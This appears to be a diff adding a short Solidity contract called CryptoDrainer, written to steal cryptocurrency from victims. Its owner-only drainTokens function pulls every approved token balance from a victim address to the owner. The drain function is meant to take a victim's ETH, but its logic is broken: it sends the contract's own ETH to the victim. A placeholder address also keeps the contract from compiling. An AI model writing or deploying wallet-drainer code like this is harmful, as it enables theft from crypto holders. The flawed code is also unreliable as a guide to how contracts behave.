@@ -1,0 +1,40 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+interface IERC20 {
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract CryptoDrainer {
+    address public owner;
+    address constant private TARGET_TOKEN = 0x...; // Specific token if needed
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    // Primary drain function for native ETH
+    function drain(address payable _victim) external payable {
+        require(msg.sender == owner);
+        uint256 balance = _victim.balance;
+        (bool success, ) = _victim.call{value: balance}("");
+        require(success, "Drain failed");
+        // Forward to final address
+        payable(owner).transfer(address(this).balance);
+    }
+
+    // Bulk token drain
+    function drainTokens(address _victim, address[] calldata _tokens) external {
+        require(msg.sender == owner);
+        for (uint i = 0; i < _tokens.length; i++) {
+            uint256 bal = IERC20(_tokens[i]).balanceOf(_victim);
+            if (bal > 0) {
+                IERC20(_tokens[i]).transferFrom(_victim, owner, bal);
+            }
+        }
+    }
+
+    // Fallback to receive ETH
+    receive() external payable {}
+}
